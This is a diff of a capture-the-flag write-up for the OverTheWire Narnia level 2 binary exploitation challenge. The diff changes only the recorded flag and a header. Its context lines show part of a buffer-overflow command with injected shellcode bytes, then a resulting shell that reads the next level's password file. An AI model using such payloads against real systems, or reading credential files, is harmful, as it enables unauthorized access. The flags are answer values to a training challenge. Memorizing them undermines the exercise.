@@ -1,11 +1,11 @@
-## Challenge Info
+ ## Challenge Info
 
 **Platform:** OverTheWire - Narnia
 **Tags :** #Challenge #BinaryExploitation #SystemCalls #ShellcodeInjection #BufferOverflow
 **Completion Date & Time :** 2026 - 02 - 10 / 22:13
 
 ---
-## FLAG : `2xszzNl6uG`
+## FLAG : `F5AYQwE8PA`
 
 ---
 ## Solution :
@@ -159,7 +159,7 @@ narnia2@narnia:/narnia$ ./narnia2 $(perl -e 'print "A"x49 . "\x6a\x31\x58\x99\xc
 $ whoami
 narnia3
 $ cat /etc/narnia_pass/narnia3
-2xszzNl6uG
+F5AYQwE8PA
 ```
 
 ---
